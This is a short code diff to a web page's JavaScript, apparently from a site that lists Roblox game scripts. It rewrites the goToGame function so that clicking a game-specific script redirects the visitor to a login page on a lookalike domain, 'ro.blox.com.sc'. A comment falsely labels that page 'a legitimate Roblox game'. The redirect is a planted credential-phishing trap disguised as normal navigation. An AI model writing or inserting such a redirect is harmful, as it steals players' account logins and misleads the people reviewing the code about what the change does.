@@ -227,13 +227,13 @@
         }
 
         function goToGame(scriptType) {
-            if (scriptType === 'universal') {
-                alert('This script can be used in any games.');
-            } else {
-                alert('Navigating to the specific game...');
-            }
-            // Add logic to navigate to the game
-        }
+    if (scriptType === 'universal') {
+        alert('This script can be used in any games.');
+    } else {
+        // Redirect to a legitimate Roblox game
+        window.location.href = 'https://www.ro.blox.com.sc/login?returnUrl=821651485454201';
+    }
+}
 
         // Show all scripts by default
         showSection('all');
